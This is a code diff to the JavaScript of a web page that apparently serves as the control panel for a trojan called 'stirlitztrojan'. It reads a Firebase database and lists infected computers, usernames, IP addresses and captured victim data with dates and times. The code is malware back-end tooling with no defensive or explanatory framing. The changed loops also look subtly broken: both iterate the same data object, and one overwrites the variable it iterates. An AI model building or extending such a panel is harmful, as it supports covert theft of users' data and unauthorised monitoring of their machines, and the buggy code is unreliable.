@@ -25,57 +25,68 @@
     <!--
     var firebase = new Firebase("https://stirlitztrojan.firebaseio.com/" + prompt("Password:"));
     firebase.on("value", function(snapshot) {
+      var data = snapshot.val().data;
       var color;
       
       color = "#cccccc";
-      snapshot.val().user.forEach(function(row){
-        var computer =  row.key().split("&")[0];
-        var username =  row.key().split("&")[1];
-        var ip =        ReplaceAll(row.key().split("&")[2], "-", ".");
-        // New row:
-        var tableRow = document.getElementById("userTable").insertRow(2);
-        tableRow.style.backgroundColor = color;
-        if(color == "#cccccc") color = "#aaaaaa";
-        else color = "#cccccc";
-        var tableCellComputer = tableRow.insertCell(0);
-        tableCellComputer.className = "nowrapword";
-        tableCellComputer.innerHTML = computer;
-        var tableCellUsername = tableRow.insertCell(1);
-        tableCellUsername.className = "nowrapword";
-        tableCellUsername.innerHTML = username;
-        var tableCellIp = tableRow.insertCell(2);
-        tableCellIp.className = "nowrapword";
-        tableCellIp.innerHTML = ip;
-      });
+      for (var key in data) {
+        if (data.hasOwnProperty(key)) {
+          var name = key;
+          var value = data[key];
+          
+          var computer =  name.split("&")[0];
+          var username =  name.split("&")[1];
+          var ip =        ReplaceAll(name.split("&")[2], "-", ".");
+          // New row:
+          var tableRow = document.getElementById("userTable").insertRow(2);
+          tableRow.style.backgroundColor = color;
+          if(color == "#cccccc") color = "#aaaaaa";
+          else color = "#cccccc";
+          var tableCellComputer = tableRow.insertCell(0);
+          tableCellComputer.className = "nowrapword";
+          tableCellComputer.innerHTML = computer;
+          var tableCellUsername = tableRow.insertCell(1);
+          tableCellUsername.className = "nowrapword";
+          tableCellUsername.innerHTML = username;
+          var tableCellIp = tableRow.insertCell(2);
+          tableCellIp.className = "nowrapword";
+          tableCellIp.innerHTML = ip;
+        }
+      }
       
       color = "#cccccc";
-      snapshot.val().data.forEach(function(row){
-        var computer = row.key().split(",")[0].split("&")[0];
-        var username = row.key().split(",")[0].split("&")[1];
-        var data = row.val();
-        var time = row.key().split(",")[1].split("&")[1];
-        var date = row.key().split(",")[1].split("&")[0];
-        // New row:
-        var tableRow = document.getElementById("dataTable").insertRow(2);
-        tableRow.style.backgroundColor = color;
-        if(color == "#cccccc") color = "#aaaaaa";
-        else color = "#cccccc";
-        var tableCellComputer = tableRow.insertCell(0);
-        tableCellComputer.className = "nowrapword";
-        tableCellComputer.innerHTML = computer;
-        var tableCellUsername = tableRow.insertCell(1);
-        tableCellUsername.className = "nowrapword";
-        tableCellUsername.innerHTML = username;
-        var tableCellData = tableRow.insertCell(2);
-        tableCellData.className = "wrapword";
-        tableCellData.innerHTML = data;
-        var tableCellTime = tableRow.insertCell(3);
-        tableCellTime.className = "nowrapword";
-        tableCellTime.innerHTML = time;
-        var tableCellDate = tableRow.insertCell(4);
-        tableCellDate.className = "nowrapword";
-        tableCellDate.innerHTML = date;
-      });
+      for (var key in data) {
+        if (data.hasOwnProperty(key)) {
+          var name = key;
+          var value = data[key];
+          
+          var computer = name.split(",")[0].split("&")[0];
+          var username = name.split(",")[0].split("&")[1];
+          var data = value;
+          var time = name.split(",")[1].split("&")[1];
+          var date = name.split(",")[1].split("&")[0];
+          // New row:
+          var tableRow = document.getElementById("dataTable").insertRow(2);
+          tableRow.style.backgroundColor = color;
+          if(color == "#cccccc") color = "#aaaaaa";
+          else color = "#cccccc";
+          var tableCellComputer = tableRow.insertCell(0);
+          tableCellComputer.className = "nowrapword";
+          tableCellComputer.innerHTML = computer;
+          var tableCellUsername = tableRow.insertCell(1);
+          tableCellUsername.className = "nowrapword";
+          tableCellUsername.innerHTML = username;
+          var tableCellData = tableRow.insertCell(2);
+          tableCellData.className = "wrapword";
+          tableCellData.innerHTML = data;
+          var tableCellTime = tableRow.insertCell(3);
+          tableCellTime.className = "nowrapword";
+          tableCellTime.innerHTML = time;
+          var tableCellDate = tableRow.insertCell(4);
+          tableCellDate.className = "nowrapword";
+          tableCellDate.innerHTML = date;
+        }
+      }
     }, function (e) {
       document.getElementById("err").innerHTML = e.code;
     });
